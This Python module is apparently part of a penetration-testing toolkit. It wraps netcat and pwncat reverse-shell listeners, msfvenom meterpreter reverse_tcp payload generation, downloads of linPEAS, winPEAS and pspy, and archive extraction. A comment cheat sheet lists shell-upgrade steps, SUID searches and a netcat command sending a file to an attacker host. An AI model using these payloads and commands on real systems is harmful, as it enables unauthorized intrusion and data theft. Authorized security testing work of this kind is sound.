import json
import logging
from enum import Enum
from typing import List, Union

import verboselogs

from ..utils.defaultLogBanner import log_runBanner
from ..utils.locater import Locator
from ..utils.utilsFolderHelper import create_service_folder
from ..utils.utilsHelper import get_ip_address
from ..utils.utilsProcessHelper import run_command_endless, run_command_output_loop


# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------
class DownloadWhat(str, Enum):
    LINPEAS = 'LINPEAS'
    WINPEAS = 'WINPEAS'
    PSPY64 = 'PSPY64'


class ToolService:

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    def __init__(self):
        '''
            tools service
        '''
        logging.log(logging.DEBUG, 'tool-service is initiated')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def geo(self, host: str) -> None:
        '''
            ...
        '''
        service_name: str = 'GEO'
        log_runBanner(service_name)
        path: str = create_service_folder('geo', host)

        data = Locator().query(ip=host)
        if data is not None:
            with open(f'{path}/geo.log', "w") as r:
                r.write(json.dumps(data, indent=4))

            logging.log(
                verboselogs.SUCCESS,
                f'[*] {service_name} Done! View the log reports under {path}/',
            )

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def download(self, what: DownloadWhat) -> None:
        '''
            ...
        '''
        service_name: str = 'WGET'
        log_runBanner(service_name)
        path: str = create_service_folder('download')
        url: Union[str, None] = None
        hint: Union[str, None] = None
        if what == DownloadWhat.LINPEAS:
            url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
        elif what == DownloadWhat.WINPEAS:
            url = 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat'
        elif what == DownloadWhat.PSPY64:
            url = 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64'
            hint = f'run example: {path}/pspy64 -pfc -i 100'
        if url is not None:
            run_command_output_loop(f'wget...', [['wget', url, '-P', path]])
            if hint is not None:
                logging.log(logging.INFO, hint)
        logging.log(
            verboselogs.SUCCESS,
            f'[*] {service_name} Done! View the log reports under {path}/',
        )

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
    # TODO: add usfull command, to not need to remember all :D

    def info_list(self) -> None:
        '''
            ...
        '''

    # REVERSE SHELL
    # - start listener
    # + pwncat -l $LPORT -vv --self-inject /bin/sh:$LHOST:$LPORT
    # + nc -lvnp $LPORT
    # - improve
    # + python3 -c 'import pty; pty.spawn("/bin/bash")'
    # + 'Ctr-Z'
    # + stty -a
    # + stty raw -echo; fg
    # + export SHELL=bash;export TERM=xterm-256color;stty rows 19 columns 94
    # SEARCH
    # - find '+s' files
    # + find / -perm -u=s -type f 2>/dev/null
    # - find 'setuid' files
    # + find / -perm -4000 -exec ls -al {} \; 2>/dev/null
    # + getcap -r / 2>/dev/null
    # - find files by specific group
    # + find / -group <GROUP> 2>/dev/null
    # TRANSFER
    # - from target
    # + nc -l -p $LPORT > $FILE
    # + nc -w 3 $LHOST $LPORT < $FILE
    def nc(self, port: int = 9001) -> None:
        '''
            ...
        '''
        service_name = 'NC'
        log_runBanner(service_name)
        path = create_service_folder('tool/nc')
        use_sudo = []
        if port <= 1024:
            use_sudo = ['sudo']
        cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
        log_runBanner(f'pwncat listening...')
        run_command_endless(command_list=cmd)
        logging.log(
            verboselogs.SUCCESS,
            f'[*] {service_name} Done! View the log reports under {path}/',
        )

    def pwncat(self, host: Union[str, None] = None, port: int = 9001) -> None:
        '''
            ...
        '''
        service_name = 'PWNCAT'
        log_runBanner(service_name)
        path = create_service_folder('tool/pwncat')
        if host is None:
            host = get_ip_address()
        if host is not None:
            use_sudo = []
            options_port = []
            if port is not None:
                options_port = ['-l', str(port)]
                if port <= 1024:
                    use_sudo = ["sudo"]
            # if len(self.ctx.use_sudo) > 0:
            #     use_sudo = ["sudo"]
            cmd = use_sudo + ['pwncat'] + options_port + [
                '-vv', '--self-inject', f'/bin/sh:{host}:{port}'
            ]
            log_runBanner(f'pwncat listening...')
            run_command_endless(command_list=cmd)
            logging.log(
                verboselogs.SUCCESS,
                f'[*] {service_name} Done! View the log reports under {path}/',
            )
        else:
            logging.log(logging.ERROR, 'missing host')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def msfvenom(
        self,
        host: str,
        port: int,
        format: str = 'dll',
        file_arch: str = '64',
        os: str = 'windows',
    ) -> None:
        '''
            ...
        '''
        service_name = 'MSFVENOM'
        log_runBanner(service_name)
        path = create_service_folder('tool/msfvenom')
        if file_arch == '32':
            arch = 'x86'
        else:
            arch = 'x64'
        reverse_payload = []
        if os == 'linux':
            # reverse_payload = ['-p', f'linux/{arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'linux/{arch}/meterpreter/reverse_tcp']
        elif os == 'windows':
            # reverse_payload = ['-p', f'windows/{arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'windows/{arch}/meterpreter/reverse_tcp']
        reverse_format = ['-f', format]
        reverse_arch = [f'-a{arch}']
        run_command_output_loop(
            f'msfvenom create reverse shell...',
            [
                ['msfvenom'] +
                reverse_payload +
                [
                    f'LHOST={host}',
                    f'LPORT={port}',
                    '-o',
                    f'{path}/reverse_shell.{format}',
                ] +
                reverse_format +
                reverse_arch
            ],
        )
        logging.log(
            verboselogs.SUCCESS,
            f'[*] {service_name} Done! View the log reports under {path}/',
        )

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def pywhat(self, file: str) -> None:
        '''
            ...
        '''
        service_name = 'PYWHAT'
        log_runBanner(service_name)
        path = create_service_folder('tool/pywhat')
        run_command_output_loop(
            f'extract file...', [['pywhat', file], ['tee', f'{path}/pywhat.log']]
        )
        logging.log(
            verboselogs.SUCCESS,
            f'[*] {service_name} Done! View the log reports under {path}/',
        )

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def extract(self, file: str) -> None:
        '''
            ...
        '''
        service_name = 'EXTRACT'
        log_runBanner(service_name)
        path = create_service_folder('tool/extract')
        extract_type: Union[List[str], None] = None
        if '.tar.bz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tar.gz' in file:
            extract_type = ['tar', 'xzf']
        if '.bz2' in file:
            extract_type = ['bunzip2']
        if '.rar' in file:
            extract_type = ['unrar', 'x']
        if '.gz' in file:
            extract_type = ['gunzip']
        if '.tar' in file:
            extract_type = ['tar', 'xf']
        if '.tbz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tgz' in file:
            extract_type = ['tar', 'xzf']
        if '.tar.xz' in file:
            extract_type = ['tar', 'xvfJ']
        if '.zip' in file:
            extract_type = ['unzip']
        if '.Z' in file:
            extract_type = ['uncompress']
        if '.7z' in file:
            extract_type = ['7z', 'x']
        if '.exe' in file:
            extract_type = ['7z', 'x']
        if extract_type is not None:
            run_command_output_loop(f'extract file...', [extract_type + [file]])
        logging.log(
            verboselogs.SUCCESS,
            f'[*] {service_name} Done! View the log reports under {path}/',
        )
